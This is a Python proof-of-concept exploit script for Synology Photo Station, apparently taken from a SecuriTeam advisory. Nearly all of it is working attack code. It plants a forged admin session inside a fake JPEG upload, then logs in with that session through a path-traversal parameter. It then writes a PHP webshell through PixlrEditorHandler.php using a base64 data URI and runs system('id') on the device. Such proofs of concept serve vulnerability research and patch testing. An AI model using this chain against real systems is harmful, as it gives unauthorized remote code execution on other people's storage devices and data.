'''
Source: https://blogs.securiteam.com/index.php/archives/3356

Vulnerability details
The remote code execution is a combination of 4 different vulnerabilities:

Upload arbitrary files to the specified directories
Log in with a fake authentication mechanism
Log in to Photo Station with any identity
Execute arbitrary code by authenticated user with administrator privileges
The chain of vulnerabilities will allow you, in the end, to execute code as:

uid=138862(PhotoStation) gid=138862(PhotoStation) groups=138862(PhotoStation)
'''
import requests

# What server you want to attack
synology_ip = 'http://192.168.1.100'

# Your current IP
ip = '192.168.1.200'

# PHP code you want to execute
php_to_execute = '<?php echo system("id"); ?>'

encoded_session = 'root|a:2:{s:19:"security_identifier";s:'+str(len(ip))+':"'+ip+'";s:15:"admin_syno_user";s:7:"hlinak3";}'

print "[+] Set fake admin sesssion"
file = [('file', ('foo.jpg', encoded_session))]

r = requests.post('{}/photo/include/synotheme_upload.php'.format(synology_ip), data = {'action':'logo_upload'}, files=file)
print r.text

print "[+] Login as fake admin"

# Depends on version it might be stored in different dirs
payload = {'session': '/../../../../../var/packages/PhotoStation/etc/blog/photo_custom_preview_logo.png'}
# payload = {'session': '/../../../../../var/services/photo/@eaDir/SYNOPHOTO_THEME_DIR/photo_custom_preview_logo.png'}

try_login = requests.post('{}/photo/include/file_upload.php'.format(synology_ip), params=payload)

whichact = {'action' : 'get_setting'}
r = requests.post('{}/photo/admin/general_setting.php'.format(synology_ip), data=whichact, cookies=try_login.cookies)
print r.text

print "[+] Upload php file"

c = {'action' : 'save', 'image' : 'data://text/plain;base64,'+php_to_execute.encode('base64'), 'path' : '/volume1/photo/../../../volume1/@appstore/PhotoStation/photo/facebook/exploit'.encode("base64"), 'type' : 'php'}
r = requests.post('{}/photo/PixlrEditorHandler.php'.format(synology_ip), data=c, cookies=try_login.cookies)
print r.text


print "[+] Execute payload"
f = requests.get('{}/photo/facebook/exploit.php'.format(synology_ip))

print f.text